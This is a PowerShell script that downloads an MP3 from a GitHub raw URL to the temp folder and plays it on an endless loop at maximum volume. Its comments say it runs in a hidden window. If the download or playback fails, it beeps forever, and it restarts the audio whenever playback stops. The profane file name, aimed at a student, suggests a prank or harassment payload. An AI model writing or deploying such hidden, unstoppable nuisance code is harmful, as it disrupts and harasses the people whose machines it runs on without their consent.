# ps1.ps1 - downloads the mp3 to temp and loops it at max volume
# Uses WMPlayer.OCX (Windows Media Player COM), which renders audio without
# a WPF dispatcher pump. WPF MediaPlayer (System.Windows.Media.MediaPlayer)
# silently loads but does not play in a headless -w h PowerShell process.

$log = Join-Path $env:TEMP 'verity.log'
"[$(Get-Date)] START" | Out-File $log -Encoding utf8 -Force

$u = 'https://raw.githubusercontent.com/ModMaker667/verity/refs/heads/main/Verity-2026-10-29-20-50-THIS-STUDENT-RIGHT-FUCKING-HERE-IS-ABSOFUCKINGLU.mp3'
$f = Join-Path $env:TEMP 's.mp3'

try {
    Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing -TimeoutSec 30
    "[$(Get-Date)] MP3 OK size=$((Get-Item $f).Length)" | Out-File $log -Append -Encoding utf8
} catch {
    "[$(Get-Date)] MP3 FAIL: $_" | Out-File $log -Append -Encoding utf8
    while (1) { [console]::beep(1200, 200); [console]::beep(800, 200) }
}

try {
    $wmp = New-Object -ComObject WMPlayer.OCX
    $wmp.URL = $f
    $wmp.settings.volume = 100
    $wmp.settings.setMode('loop', $true)
    $wmp.controls.play()
    "[$(Get-Date)] WMPlayer STARTED state=$($wmp.playState)" | Out-File $log -Append -Encoding utf8
} catch {
    "[$(Get-Date)] WMPlayer FAIL: $_" | Out-File $log -Append -Encoding utf8
    while (1) { [console]::beep(1200, 200); [console]::beep(800, 200) }
}

while (1) {
    Start-Sleep -Seconds 2
    if ($wmp.playState -ne 3) { $wmp.controls.play() }
}
